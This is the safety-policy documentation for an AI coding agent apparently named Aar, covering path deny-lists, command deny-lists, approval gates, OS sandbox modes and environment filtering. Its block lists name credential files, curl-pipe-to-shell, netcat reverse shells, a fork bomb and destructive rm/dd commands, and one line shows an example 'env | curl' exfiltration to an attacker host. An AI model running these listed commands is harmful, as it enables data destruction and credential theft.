# Safety Policy

Aar's safety system is a layered defense that controls what the agent can read, write, and execute. It operates at three levels: **denied-by-default patterns**, **policy decisions per tool call**, and **human approval gates**. The layer below those — **OS-level sandboxing of shell commands** — is covered in the [Sandbox modes](#sandbox-modes) section and [`sandbox_architecture.md`](sandbox_architecture.md).

## How it works

Every tool call passes through the **SafetyPolicy** engine before execution:

```
Tool call → SafetyPolicy.check_tool() → ALLOW / DENY / ASK
                                              ↓
                                        if ASK → ApprovalCallback → APPROVED / DENIED
```

The policy evaluates rules in this order — **hard gates first, soft approval last**:

1. **Read-only mode** — if enabled, all writes and executes are denied immediately (hard)
2. **Path rules** — explicit `PathRule` entries (first match wins) (hard)
3. **Denied paths** — glob patterns that block file access (hard)
4. **Read-only allowlist** — `read_only_paths` glob patterns that grant **reads only** (never writes); checked after denied paths, so credential patterns still win (hard allow)
5. **Allowed paths** — if set, only matching paths are permitted; anything outside is denied (hard)
6. **Command rules** — explicit `CommandRule` entries for shell commands (first match wins) (hard)
7. **Denied commands** — token patterns (`denied_commands`) plus regexes (`denied_command_patterns`) that block dangerous shell commands (hard, best-effort — see [Command deny-list](#command-deny-list))
8. **Bash forced approval** — if `allowed_paths` is set and the sandbox provides no OS-level write isolation (`local`, `wsl`), bash is forced to ASK so the user can verify the command (soft)
9. **Approval requirements** — if `require_approval_for_writes` or `require_approval_for_execute` is set, matching tools return ASK (soft)
10. If nothing matches, the tool call is **ALLOWED**

Steps 1–3 and 5–7 are hard **DENY** — they cannot be bypassed by approval. This means `allowed_paths` acts as a true sandbox boundary: a write or read that falls outside it is denied outright, not merely queued for human review. Step 4 is the one **hard allow**: it permits reads of specific paths (used for discovered skills) even when `allowed_paths` would otherwise exclude them — but it never grants writes and is checked *after* `denied_paths`, so it can never expose a credential file.

## Built-in defaults

### Denied paths (SafetyConfig)

These glob patterns are always blocked for file read/write tools, regardless of transport or flags:

| Category | Patterns |
|----------|----------|
| Unix system files | `/etc/shadow`, `/etc/passwd`, `/etc/sudoers`, `/etc/sudoers.d/**` |
| Environment files | `**/.env`, `**/.env.*` |
| Credentials | `**/credentials`, `**/credentials.*`, `**/secrets`, `**/secrets.*` |
| Key material | `**/*.pem`, `**/*.key`, `**/*.p12`, `**/*.pfx` |
| SSH | `**/.ssh/**`, `**/id_rsa`, `**/id_dsa`, `**/id_ecdsa`, `**/id_ed25519` |
| Cloud providers | `**/.aws/**`, `**/.azure/**`, `**/.config/gcloud/**` |
| Package manager tokens | `**/.netrc`, `**/.npmrc`, `**/.pypirc` |

### Denied commands (PolicyConfig)

These substring patterns block dangerous shell commands:

| Category | Patterns |
|----------|----------|
| Filesystem destruction | `rm -rf /`, `rm -rf /*`, `rm -rf ~`, `mkfs`, `dd if=`, `> /dev/sda` |
| System control | `shutdown`, `reboot`, `halt`, `poweroff`, `init 0`, `init 6` |
| Fork bomb | `:(){:\|:&};:` |
| Permission escalation | `chmod 777`, `chmod -R 777` |
| Remote code execution | `curl\|sh`, `curl \| sh`, `curl\|bash`, `curl \| bash`, `wget\|sh`, `wget \| sh`, `wget\|bash`, `wget \| bash` |
| Reverse shell | `nc -e`, `ncat -e` |
| History wipe | `history -c` |

Both lists can be extended via configuration (CLI flags, config files, or programmatic API) but not reduced below the defaults through CLI flags alone.

### Command audit log

`PolicyConfig.log_all_commands` (default **`false`**) controls whether every
shell command the agent tries to run is logged to the agent audit log at INFO
level.

The default is off because agents frequently receive commands with credentials
in them (for example `curl -H "Authorization: Bearer ..."` or
`psql "postgres://user:pass@..."`). When enabled, the audit log passes each
command through a best-effort secret redactor that scrubs common patterns
before writing to disk:

- `api_key=…`, `token=…`, `password=…`, `bearer=…`, `authorization=…` (any case, `=` or `:` separator)
- `--api-key …`, `--token …`, `--password …`, `--bearer …`, `--auth …` flags
- `Bearer <token>` headers
- Bare 32+ character opaque tokens (heuristic — may produce false positives)

Redaction is best-effort and not a substitute for not logging sensitive
commands in the first place. Enable `log_all_commands` only when you need
deep audit trails and have reviewed what the agent is likely to run.

## `allowed_paths` and bash

`allowed_paths` is a hard path boundary for file tools (`read_file`, `write_file`, `edit_file`, `list_directory`). Any access outside the whitelist is **denied**, regardless of approval settings.

**Bash is different.** A shell command can access any path; there is no reliable way to inspect what paths an arbitrary command will touch before running it. Aar handles this by mode:

| Sandbox mode | Bash behaviour when `allowed_paths` is set |
|---|---|
| `local` | Forced **ASK** — user must approve every bash command |
| `wsl` | Forced **ASK** — Windows filesystem is fully mounted inside WSL, no write restriction |
| `linux` | **No forced ASK** — Landlock enforces write restrictions at kernel level |
| `windows` | **No forced ASK** — Low Integrity level enforces write restrictions at OS level |

For `linux` and `windows` modes, `require_approval_for_execute` still applies as normal. The forced-ASK only kicks in when the sandbox cannot actually enforce the boundary.

The `<cwd>/**` sentinel in `allowed_paths` is expanded to the working directory path at startup — so `aar init` writes `["<cwd>/**"]` to the config and it resolves correctly regardless of where `aar` is launched.

## `read_only_paths` and skills

`read_only_paths` is a read-only counterpart to `allowed_paths`: paths matching one of its glob patterns may be **read** but never **written**. It is checked *after* `denied_paths` (so a `.pem`/`.env`/credential file under a matching directory is still blocked) and *before* the `allowed_paths` whitelist's hard deny (so a matching read is permitted even when `allowed_paths` would otherwise exclude it).

Its main job is making **[skills](prompting.md#skills-lazy-load-instructions) work out of the box**. Skills usually live in `~/.aar/skills/` (global) or `<project_rules_dir>/skills/` (project) — both *outside* the default `allowed_paths` of `["<cwd>/**"]`. Without help, the model would be told about a skill in the system prompt but then denied when it tried to `read_file` the skill's instructions.

To close that gap, the agent automatically adds a `<base_dir>/**` read-only pattern for every discovered skill (the skill's directory, so bundled resources are reachable too). This happens at startup and whenever the system prompt is rebuilt; the list is **reassigned, not appended**, so it never accumulates duplicates. The result: skills are readable regardless of where they live, writes to skill files are still denied, and `denied_paths` still wins over everything. No configuration is required — set `skills_enabled: false` to opt out entirely.

> Unlike `path_rules` (evaluated first, and able to override `denied_paths`), `read_only_paths` can never expose a denied file. That's why skills use it rather than a read-only `PathRule`.

## Per-transport defaults

### `aar chat` and `aar tui` (interactive)

**Cwd-restricted by default** (from `~/.aar/config.json` written by `aar init`):

| Setting | Default | Effect |
|---------|---------|--------|
| `safety.require_approval_for_writes` | **true** | Prompts before every write |
| `safety.require_approval_for_execute` | **true** | Prompts before every shell command |
| `safety.allowed_paths` | `["<cwd>/**"]` | File tools restricted to current directory |

With `local` sandbox (the default), bash is additionally forced to ASK because `allowed_paths` is set and local mode cannot enforce the boundary.

Widen access for trusted workflows:

```bash
# Remove path restriction entirely
aar chat --no-restrict-to-cwd

# Remove all approval prompts too
aar chat --no-require-approval --no-restrict-to-cwd
```

Or add additional paths in `config.json`:

```json
{
  "safety": {
    "allowed_paths": ["<cwd>/**", "/home/user/shared/**"]
  }
}
```

### `aar run` (automation)

Same defaults as `aar chat` — `allowed_paths: ["<cwd>/**"]` applies. The difference is that `run` is non-interactive, so any ASK that cannot be answered will be auto-denied unless you pre-configure approvals.

### `aar serve` (web API)

The web server accepts an optional `safety` field in the request body to override safety settings per request:

```json
{
  "prompt": "do something",
  "safety": {
    "read_only": true,
    "require_approval_for_writes": true
  }
}
```

By default, the web transport has **no approval callback** — any tool call that returns ASK is auto-denied (no human present). To add a human gate, implement an external approval flow via SSE events.

The `--read-only` flag is available on `aar serve` for global read-only mode.

## CLI flags reference

| Flag | Available on | Description |
|------|-------------|-------------|
| `--read-only` | chat, run, tui, serve | Block all write and execute tools |
| `--require-approval / --no-require-approval` | chat, run, tui | Prompt before write/execute tools |
| `--restrict-to-cwd / --no-restrict-to-cwd` | chat, run, tui | Restrict file tools to `cwd/**` |
| `--denied-paths TEXT` | chat, run, tui | Comma-separated globs appended to defaults |
| `--allowed-paths TEXT` | chat, run, tui | Comma-separated globs (overrides `--restrict-to-cwd`) |
| `--config PATH` | chat, run, tui, serve | Load full `AgentConfig` from a JSON file |

## Configuration file

Create a JSON file matching the `AgentConfig` schema:

```json
{
  "provider": {
    "name": "anthropic",
    "model": "claude-sonnet-4-6"
  },
  "safety": {
    "read_only": false,
    "require_approval_for_writes": true,
    "require_approval_for_execute": true,
    "denied_paths": ["**/.env", "**/secrets/**"],
    "allowed_paths": ["/home/user/project/**"],
    "sandbox": {
      "mode": "auto",
      "linux":   { "workspace": "/home/user/project" },
      "windows": { "workspace": "C:/Users/user/project" }
    }
  },
  "max_steps": 30,
  "timeout": 120.0
}
```

Load with:

```bash
aar chat --config aar.json
```

Or programmatically:

```python
from agent.core.config import load_config
from pathlib import Path

config = load_config(Path("aar.json"))
```

**Precedence** (lowest to highest): `PolicyConfig defaults` -> `config file (--config)` -> `explicit CLI flags`

## Approval callback

When a policy decision is ASK, the `ApprovalCallback` is invoked. The callback receives the tool spec and the tool call, and returns one of:

| Result | Meaning |
|--------|---------|
| `APPROVED` | Allow this specific call |
| `DENIED` | Block this specific call |
| `APPROVED_ALWAYS` | Allow this call and all future calls to the same tool |

The CLI and TUI transports use a terminal prompt:

```
+----------------------------------+
| Approval Required                |
|   bash                           |
|     command: rm -rf build/       |
+----------------------------------+
Allow? [y]es / [n]o / [a]lways:
```

### Custom approval callback

```python
from agent.safety.permissions import ApprovalResult

async def my_callback(spec, tool_call) -> ApprovalResult:
    # Your logic — Slack notification, web UI, auto-approve known tools, etc.
    return ApprovalResult.APPROVED

agent = Agent(config=config, approval_callback=my_callback)
```

## Sandbox modes

The sandbox is the OS-level enforcement layer that wraps shell commands. It operates on top of the policy engine's `allowed_paths` check — the policy guards Aar's own tool calls, the sandbox guards anything that escapes through a subprocess.

> **Important distinction**: filesystem ACLs (`icacls`, `chmod`) control who can access a directory from *outside*. To restrict where a running *process* can go, you need OS-level mechanisms that act on the process itself — which is what the platform-native sandboxes provide.

For the full execution-path diagrams and honest per-mode strength/weakness analysis, see [`sandbox_architecture.md`](sandbox_architecture.md). This section is the configuration reference.

### Available modes

| Mode | Platform | Mechanism |
|------|----------|-----------|
| `local` | all | No isolation — plain `bash -c cmd` |
| `linux` | Linux ≥ 5.13 | Landlock LSM (write-restricted to workspace) + `ulimit -v` memory cap |
| `windows` | Windows | Job Object (memory/process caps) + Low Integrity Level (write-restricted) |
| `wsl` | Windows | Dedicated WSL2 distro (`wsl -d <distro> -- sh -c <cmd>`) |
| `auto` | all | Picks `linux` on Linux, `windows` on Windows, `local` elsewhere |

### Choosing a mode

```
Trusted local dev            →  local    (default, no overhead)
Linux production             →  linux    (strongest — Landlock is kernel-enforced)
Windows production           →  windows  (Job Object + Low Integrity)
Windows, multi-language      →  wsl      (disposable Alpine/Ubuntu execution environment)
Any production, cross-plat   →  auto     (picks best available for the platform)
macOS                        →  local    (no OS-level sandbox available)
```

### What each mode actually restricts

| Mode | Writes blocked outside workspace? | Reads blocked? | Resource caps | Network isolation | Bash forced-ASK when `allowed_paths` set? |
|------|----------------------------------|----------------|---------------|-------------------|----|
| `local` | no | no | none | no | **yes** |
| `linux` | **yes** — kernel-enforced via Landlock (Linux ≥ 5.13) | no (Landlock v1 doesn't restrict reads) | `ulimit -v` memory cap | no | no |
| `windows` | **mostly** — Low IL blocks writes to user profile, Program Files, HKCU; workspace stamped Low-writable | no — Low IL is write-side only | Job Object memory + process count | no | no |
| `wsl` | **no** — entire Windows filesystem auto-mounted at `/mnt/<drive>/` | no | none | no | **yes** |

**No sandbox mode restricts outbound network access.** None of the current modes restrict outbound network; consider running the agent inside an isolated VM or container outside of Aar if network egress control is required.

### `linux` — Linux Landlock (recommended for Linux)

Landlock is a kernel security module (Linux ≥ 5.13) that lets an unprivileged process restrict its own filesystem access before spawning a child. After `landlock_restrict_self()` the spawned subprocess literally cannot call `openat(O_WRONLY, ...)` on files outside the allowed paths — the kernel refuses the syscall. No root, no container, no daemon required.

**What it enforces:**
- Subprocess can **read and execute** from anywhere on the filesystem (needed for tools, libraries, etc.)
- Subprocess can **only write** within the configured workspace directory
- Memory cap via `ulimit -v`
- Restricted environment variables (only `PATH`, `HOME`, `TERM`, `LANG`)

**Fallback:** If Landlock is unavailable (kernel < 5.13, LSM disabled), a warning is logged and the sandbox falls back to environment restriction + `ulimit` only.

**Configuration:**

```json
{
  "safety": {
    "sandbox": {
      "mode": "linux",
      "linux": {
        "workspace": "/home/user/project",
        "max_memory_mb": 512
      }
    }
  }
}
```

```python
from agent.core.config import SafetyConfig, SandboxConfig, LinuxSandboxConfig

safety = SafetyConfig(
    sandbox=SandboxConfig(
        mode="linux",
        linux=LinuxSandboxConfig(workspace="/home/user/project", max_memory_mb=512),
    )
)
```

If `workspace` is not set, it defaults to the current working directory at runtime.

**Smoke test** (verify Landlock is blocking writes outside workspace):

```bash
python -c "
from agent.safety.sandbox import LinuxSandbox
import asyncio

sb = LinuxSandbox(workspace='/tmp/my_workspace')
# Should be blocked — /etc is outside workspace
r = asyncio.run(sb.execute('echo test > /etc/test_aar'))
print('blocked' if r.exit_code != 0 else 'NOT blocked — landlock unavailable')
"
```

### `windows` — Windows Job Objects + Low Integrity (recommended for Windows)

Windows has no equivalent of Landlock. The `windows` mode layers two mechanisms:

**1. Job Object** (via `ctypes kernel32`):
- Enforces working-set memory limit (`windows.max_memory_mb`, default 512 MB)
- Caps the number of active child processes (`windows.max_processes`, default 10)
- `KILL_ON_JOB_CLOSE` — orphaned processes in the job are killed automatically when the agent exits

**2. Low Integrity Level** (optional, `windows.use_low_integrity: true` by default):
- The subprocess runs at Windows Mandatory Integrity Level *Low* (the same level as IE Protected Mode and sandboxed browser tabs)
- A Low-integrity process **cannot write to** Medium/High-integrity locations: user profile (`C:\Users\<you>`), `C:\Program Files`, registry
- The workspace is stamped as Low-integrity-writable via `icacls /setintegritylevel Low` so the subprocess *can* write there
- If the integrity-level helper fails (rare: policy, UAC edge cases), the sandbox falls back to Job Object only and logs a warning

**`icacls` role clarification**: `icacls` here is used correctly — it grants the Low-integrity subprocess write access *to the workspace*, not to restrict it. The restriction comes from the Low Integrity token.

**Configuration:**

```json
{
  "safety": {
    "sandbox": {
      "mode": "windows",
      "windows": {
        "workspace": "C:/Users/user/project",
        "max_memory_mb": 512,
        "max_processes": 10,
        "use_low_integrity": true
      }
    }
  }
}
```

```python
from agent.core.config import SafetyConfig, SandboxConfig, WindowsSandboxConfig

safety = SafetyConfig(
    sandbox=SandboxConfig(
        mode="windows",
        windows=WindowsSandboxConfig(
            workspace="C:/Users/user/project",
            max_memory_mb=512,
            max_processes=10,
            use_low_integrity=True,
        ),
    )
)
```

Disable Low Integrity if you hit permission issues (rare) while keeping Job Object limits:

```json
{
  "safety": {
    "sandbox": {
      "mode": "windows",
      "windows": { "use_low_integrity": false }
    }
  }
}
```

### `wsl` — dedicated WSL2 distro

A dedicated, disposable WSL2 distro is used as the execution environment. Commands run via `wsl -d <distro> -- sh -c <cmd>`, isolated from your main WSL2 setup and the host Python installation. The distro is managed by `aar sandbox setup / status / reset`.

**What it isolates:**
- Distro filesystem (`/etc`, `/usr`, `/home`, installed packages) is separate from host Windows and any other WSL2 distros
- `apk add` / `apt-get install` / `pip install` stays inside the distro — host is untouched
- State is resettable via `aar sandbox reset`
- Built-in profiles install `bubblewrap` and `socat`, so tools that provide a nested Linux/WSL2 sandbox can enforce filesystem isolation and proxy network traffic
- If WSL package-repository access is blocked, Alpine packages can optionally be downloaded on Windows and installed from a temporary `/mnt/<drive>` cache

**What it does NOT isolate (important):**
- The entire Windows filesystem is auto-mounted at `/mnt/<drive>/` by WSL2. `rm -rf /mnt/c/Users/you` is just as effective as running it natively.
- No outbound network restriction (WSL2 shares the host network)
- No memory or process count cap
- The agent runs as **root** inside the distro

**Workspace-escape guard:** the sandbox refuses to `cd` outside the configured
workspace before spawning the shell. A caller that passes a `cwd` which
resolves outside — via absolute path, mixed-case drive letters, or `..`
traversal — gets an immediate error result; the command never runs. This is a
cheap last-line check, not a replacement for a real FS sandbox.

Installing `bubblewrap` and `socat` does not make Aar's WSL backend use them automatically; the limitations above still apply to commands Aar launches directly. They are available for nested sandbox runtimes that explicitly invoke them.

**Use this mode for:** a clean, wipeable multi-language execution environment (install Node, Go, Rust, etc. without polluting your host). **Not suitable for:** protecting against a malicious command — use `windows` mode (or `linux` on Linux) for write isolation.

**Configuration** (defaults work out of the box once `aar sandbox setup` has been run):

```json
{
  "safety": {
    "sandbox": {
      "mode": "wsl",
      "wsl": {
        "profile": "~/.aar/distros/alpine-base.json"
      }
    }
  }
}
```

`aar init` writes built-in profiles to `~/.aar/distros/`. Point `profile` at one and `aar sandbox setup` picks up everything — rootfs URL, checksum, packages, pre-install commands, and the system-prompt description the model sees.

> **Only `null` defers to the profile.** Every other inline `wsl` value overrides
> it — including `""` and `[]`. A config that keeps the sample's Alpine defaults
> (`"rootfs_url": "…alpine…"`, `"packages": ["python3", "py3-pip", "bubblewrap", "socat"]`,
> `"host_package_download": false`, `"package_install_command": "apk add …"`,
> `"system_prompt_hint": ""`) while
> pointing `profile` at `ubuntu.json` will download an Alpine rootfs, try to
> install with `apk`, and tell the model nothing about the distro — and because
> the profile's `rootfs_sha256` no longer matches the overridden URL,
> `aar sandbox setup` aborts on a checksum mismatch. When you use a profile,
> delete the provisioning keys from `config.json` and let the profile own them.
>
> Run `aar sandbox status` to see the values actually in effect after the merge.

You can also configure the distro inline without a profile:

```json
{
  "safety": {
    "sandbox": {
      "mode": "wsl",
      "wsl": {
        "distro": "aar-sandbox",
        "shell": "sh",
        "rootfs_url": "https://dl-cdn.alpinelinux.org/alpine/v3.23/releases/x86_64/alpine-minirootfs-3.23.0-x86_64.tar.gz",
        "pre_install_commands": [],
        "packages": ["python3", "py3-pip", "bubblewrap", "socat", "nodejs", "npm"],
        "host_package_download": false,
        "package_install_command": "apk add --no-cache {packages}",
        "system_prompt_hint": "Alpine Linux. Package manager: apk (NOT apt). Community repo enabled. You CAN run 'apk add <pkg>' to install packages."
      }
    }
  }
}
```

#### Managing the distro — `aar sandbox`

The `aar sandbox` sub-app owns the WSL2 distro lifecycle:

```bash
aar sandbox setup                          # downloads rootfs, imports distro, installs packages
aar sandbox setup --force                  # unregister existing + recreate
aar sandbox setup --packages "python3,py3-pip,nodejs,npm"  # add desired packages; bwrap/socat are mandatory
aar sandbox setup --distro my-sandbox      # custom distro name

aar sandbox status                         # show distro, Python, bubblewrap, and socat status

aar sandbox reset                          # unregister + recreate, prompts for confirmation
aar sandbox reset --yes                    # skip confirmation
```

All flags on `setup` and `reset` are optional overrides — primary values come from `~/.aar/config.json` (`safety.sandbox.wsl.*`), including any loaded profile. `bubblewrap` and `socat` are appended to the package list even when `--packages` is supplied, because WSL sandbox runtimes require both.

`setup` downloads the rootfs (~3 MB for Alpine), imports it as a dedicated WSL2 distro, runs any `pre_install_commands`, and installs packages normally inside WSL by default.

For managed networks that block WSL egress, set `host_package_download` to `true`. Aar then downloads Alpine's signed `APKINDEX.tar.gz` files on Windows, asks `apk` inside WSL to resolve dependencies without network access, downloads the selected APKs on Windows, and installs them inside WSL from the temporary mounted cache with signature verification enabled. The cache is deleted after setup. This optional mode currently supports Alpine/`apk` only; Ubuntu and other package managers still require repository access from inside WSL.

```json
{
  "safety": {
    "sandbox": {
      "wsl": {
        "host_package_download": true
      }
    }
  }
}
```

Package-manager errors or missing `bwrap`/`socat` executables fail setup instead of marking a partially provisioned distro ready. Run `aar sandbox status` afterwards to verify the configuration and the installed Python, Bubblewrap, and socat versions.

Existing distros are not changed when a profile file is updated. After upgrading Aar, run `aar init --force` to refresh `~/.aar/distros/`, then `aar sandbox reset --yes` to rebuild the selected distro with the new packages. Back up any distro-internal state first; reset deletes it.

If `aar sandbox status` reports that the distro does not exist but its install path still contains a stale `ext4.vhdx`, plain `setup` stops before downloading and reports the conflict. Run `aar sandbox setup --force` to remove that orphaned install directory and recreate the distro.

**Reset behavior:** unregisters the distro, re-downloads rootfs, re-runs pre-install commands, reinstalls packages. Workspace files on the Windows filesystem (`/mnt/<drive>/...`) are **not affected** — only the distro's own filesystem is wiped.

#### Using a non-Alpine rootfs

Create a profile file (e.g. `~/.aar/distros/ubuntu.json`) and point `profile` at it. Set `package_install_command` to match the distro's package manager (the `{packages}` placeholder is expanded at runtime), and use `pre_install_commands` to bootstrap the package manager before packages are installed:

```json
{
  "distro": "aar-ubuntu",
  "shell": "bash",
  "rootfs_url": "https://cloud-images.ubuntu.com/wsl/releases/24.04/current/ubuntu-noble-wsl-amd64-wsl.rootfs.tar.gz",
  "pre_install_commands": ["apt-get update -q"],
  "packages": ["python3", "python3-pip", "bubblewrap", "socat", "nodejs", "npm"],
  "host_package_download": false,
  "package_install_command": "apt-get install -y {packages}",
  "system_prompt_hint": "Ubuntu 24.04. Package manager: apt. You CAN run 'apt-get install -y <pkg>' to install packages."
}
```

Then in `~/.aar/config.json`:
```json
{ "safety": { "sandbox": { "mode": "wsl", "wsl": { "profile": "~/.aar/distros/ubuntu.json" } } } }
```

#### Windows program execution through the `wsl` sandbox

The agent can invoke native Windows executables from inside the distro via WSL2 interop:

- `notepad.exe`, `python.exe`, `git.exe`, `powershell.exe` — work directly
- Console tools (`where.exe`, `ipconfig.exe`, `cmd.exe /c "<cmd>"`) — work, with stdout piped back
- Windows paths must be translated to `/mnt/<drive>/...` (automatic for `cwd`; manual in command arguments)
- `.bat` files must be at `/mnt/...` paths and invoked via `cmd.exe /c <path>`

### `auto` — pick best available

```json
{
  "safety": {
    "sandbox": {
      "mode": "auto",
      "linux":   { "workspace": "/home/user/project" },
      "windows": { "workspace": "C:/Users/user/project" }
    }
  }
}
```

Selection logic:

| Platform | Selected mode |
|----------|--------------|
| Linux (`sys.platform.startswith("linux")`) | `linux` (Landlock + ulimit) |
| Windows (`os.name == "nt"`) | `windows` (Job Object + Low Integrity) |
| macOS / other Unix | `local` (no OS-level sandbox available) |

### `local` — no sandbox

Direct subprocess execution with no process isolation. This is the default and
the right choice for trusted local development.

The child environment *is* restricted, though: since the credential-leak fix,
`local` uses the same allow-list as the `linux` and `windows` modes instead of
handing the model's shell every variable you exported. See
[Environment variables in the sandbox](#environment-variables-in-the-sandbox).

```json
{
  "safety": {
    "sandbox": { "mode": "local" }
  }
}
```

### Environment variables in the sandbox

A shell the model controls should not be able to run
`env | curl -d @- https://attacker/`. Two independent filters apply in **every**
sandbox mode:

1. **Allow-list** (`allowed_env_vars`) — only these names are copied from the
   parent environment. Entries are case-insensitive globs. The default covers
   `PATH`, `HOME`, `TERM`, `LANG`, `LC_*`, `TMPDIR`/`TMP`/`TEMP`, `USER`,
   `SHELL` plus the Windows essentials (`SYSTEMROOT`, `COMSPEC`, …) a process
   needs to start at all.
2. **Deny-list** (`safety.sandbox.env_denylist_patterns`) — applied *after* the
   allow-list, and also when `restricted_env` is off. Defaults to
   `["*_API_KEY", "*_TOKEN", "*SECRET*", "*PASSWORD*", "AWS_*",
   "GOOGLE_APPLICATION_CREDENTIALS"]`, so widening `allowed_env_vars` (or
   inheriting the full environment) still doesn't hand over provider keys.

```json
{
  "safety": {
    "sandbox": {
      "mode": "local",
      "env_denylist_patterns": ["*_API_KEY", "*_TOKEN", "*SECRET*"],
      "local": {
        "restricted_env": true,
        "allowed_env_vars": ["PATH", "HOME", "LANG", "MY_BUILD_VAR"]
      }
    }
  }
}
```

Set `"env_denylist_patterns": []` **and** `"restricted_env": false` to
deliberately hand the full environment, credentials included, to the model.

Environment variables passed programmatically to `Sandbox.execute(env=...)` come
from the host application rather than the model, so they are merged in
unfiltered.

### Command deny-list

`denied_commands` is matched structurally, not by substring:

- The command is split into **simple commands** on `;`, `&&`, `||`, `|`, `&`
  and newlines — every one of them is checked, not just the first.
- Known wrappers are stripped (`sudo`, `doas`, `env FOO=bar`, `nohup`, `time`,
  `nice`, `ionice`, `xargs`, `command`, `exec`, `busybox`, `stdbuf`, `setsid`,
  `timeout`), so `sudo shutdown` is treated as `shutdown`.
- `sh -c '<command>'` (and `bash`/`zsh`/`dash`/`ksh`/`ash`) is expanded one
  level, up to a depth of 4.
- `rm` flags are normalised, so `rm -fr /`, `rm -r -f /` and
  `rm --recursive --force /` all match the `rm -rf /` entry.
- A single-token entry also matches the dotted tool family, so `mkfs` catches
  `mkfs.ext4`.

Shapes that involve shell metacharacters live in
`safety.denied_command_patterns` (regexes matched case-insensitively against the
raw command line). The defaults cover download-and-execute (`curl … | sh`,
`wget … | sudo bash`, …) and the classic fork bomb.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `safety.denied_commands` | `list[str] \| None` | `None` (→ built-in list) | Token patterns; a list **replaces** the defaults, `[]` disables them |
| `safety.denied_command_patterns` | `list[str] \| None` | `None` (→ built-in list) | Regexes against the raw command line; `[]` disables them |

**This is a guardrail, not a boundary.** A verb hidden inside a non-shell
interpreter (`python -c '…'`, `perl -e '…'`) or assembled at runtime from string
fragments will get through. Keep `require_approval_for_execute` on, or run under
an isolating sandbox mode, if you need a real limit.

### Sandbox configuration reference

`safety.sandbox` is a nested object with a `mode` field and one sub-object per sandbox type. Only the sub-object matching the active `mode` is used — all other sub-objects are ignored.

**Top-level `SandboxConfig`:**

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `mode` | `str` | `"local"` | Active mode: `local` \| `linux` \| `windows` \| `wsl` \| `auto` |
| `env_denylist_patterns` | `list[str] \| None` | `None` (→ built-in list) | Variable-name globs stripped in **every** mode, even when `restricted_env` is off. `[]` disables. |
| `local` | `LocalSandboxConfig` | — | Settings for `local` mode |
| `linux` | `LinuxSandboxConfig` | — | Settings for `linux` mode |
| `windows` | `WindowsSandboxConfig` | — | Settings for `windows` mode |
| `wsl` | `WslSandboxConfig` | — | Settings for `wsl` mode |

**`LocalSandboxConfig`:**

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `restricted_env` | `bool` | `true` | Pass only allow-listed environment variables to the shell |
| `allowed_env_vars` | `list[str] \| None` | `None` (→ built-in list) | Case-insensitive globs of variable names to inherit |

**`LinuxSandboxConfig`:**

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `workspace` | `str \| None` | `None` (→ cwd) | Workspace root path restricted by Landlock |
| `max_memory_mb` | `int` | `512` | Memory cap via `ulimit -v` |

**`WindowsSandboxConfig`:**

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `workspace` | `str \| None` | `None` (→ cwd) | Workspace root path stamped Low-integrity-writable |
| `max_memory_mb` | `int` | `512` | Working-set limit via Job Object |
| `max_processes` | `int` | `10` | Max active child processes — Job Object |
| `use_low_integrity` | `bool` | `True` | Run subprocess at Windows Low Integrity level |

**`WslSandboxConfig`:**

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `profile` | `str \| None` | `None` | Path to a distro profile JSON (`~`-expanded). Profile values are base defaults; inline fields override. |
| `distro` | `str` | `"aar-sandbox"` | WSL2 distro name |
| `shell` | `str` | `"sh"` | Shell binary inside the distro (`sh` works on minimal Alpine) |
| `wsl_user` | `str \| None` | `None` (distro default, often root) | Linux user to run commands as via `wsl --user`. Set to a non-root account (e.g. `"user"` — created by `aar sandbox setup` on the bundled Alpine profile) to reduce blast radius. |
| `restrict_to_workspace` | `bool` | `True` | When `True`, pin the initial cwd inside the distro via `wsl --cd <translated workspace>`. Prevents `cd /; rm -rf .` style escape from commands the model generates. Disable only if you intentionally need commands to start outside the workspace. |
| `workspace` | `str \| None` | `None` (→ cwd) | Windows path — auto-translated to `/mnt/…` |
| `rootfs_sha256` | `str \| None` | `None` (warned) | Optional SHA-256 of the rootfs tarball. When set, `aar sandbox setup` verifies the download before importing and aborts on mismatch. The bundled distro profiles in `config/distros/*.json` ship a checksum; legacy configs without one log a warning and proceed. |
| `install_path` | `str \| None` | `None` | Where to store distro data (default: `%LOCALAPPDATA%\aar\wsl-distros\<distro>`) |
| `rootfs_url` | `str` | Alpine latest-stable | Rootfs tarball URL used by `aar sandbox setup` |
| `pre_install_commands` | `list[str]` | `[]` | Shell commands run inside the distro before package installation (e.g. enabling extra repos) |
| `packages` | `list[str]` | `["python3", "py3-pip", "bubblewrap", "socat"]` | Packages installed during `aar sandbox setup`; Bubblewrap and socat support nested Linux/WSL2 sandbox runtimes |
| `host_package_download` | `bool` | `False` | Opt in to downloading signed Alpine indexes and packages on Windows and installing them from a temporary `/mnt/<drive>` cache, avoiding WSL network access. Supports Alpine/`apk` only. |
| `package_install_command` | `str` | `"apk add --no-cache {packages}"` | Command template used to install packages when `host_package_download` is `False`. `{packages}` is replaced with a space-joined list. Override in your profile for non-Alpine distros (e.g. `"apt-get install -y {packages}"`). |
| `system_prompt_hint` | `str` | `""` | Distro description injected into the model's system prompt (package manager, available tools, etc.). Set in your profile so the model knows which package manager to use. |

### Shell tool wiring

The sandbox is applied to **all shell commands** — both the built-in `bash` tool and any commands spawned by subprocesses. The `bash` tool handler delegates execution to `sandbox.execute()`, which applies the platform-appropriate isolation before the process is spawned.

This means `mode: "local"` is the only setting that provides no isolation. All other modes enforce their restrictions even for one-liner `bash` tool calls.

## Path normalization

`SafetyPolicy._normalize_path` is the single place where paths are made
comparable to patterns. It handles four input shapes:

| Input | Handling |
|-------|----------|
| Unix absolute (`/etc/shadow`) | `\` → `/`; collapse `.` / `..` segments so tricks like `/etc/../etc/passwd` still match `/etc/**` |
| Windows drive-rooted (`C:\proj\file.py`, `C:/proj/file.py`) | Lowercase the drive letter (`C:` → `c:`) so mixed-case writes can't dodge patterns; collapse components |
| UNC (`\\server\share\file`) | Converted to forward slashes; **not** resolved against CWD — it's already absolute |
| Relative (`src/app.py`, `.`, `README.md`) | Resolved against the current working directory via `Path.resolve()` |

Paths that look absolute are never fed through `Path.resolve()` because that
would prepend the current drive on Windows (`/etc/shadow` → `C:/etc/shadow`),
breaking defaults like `denied_paths=["/etc/shadow"]`.

## Architecture

The safety system has four components:

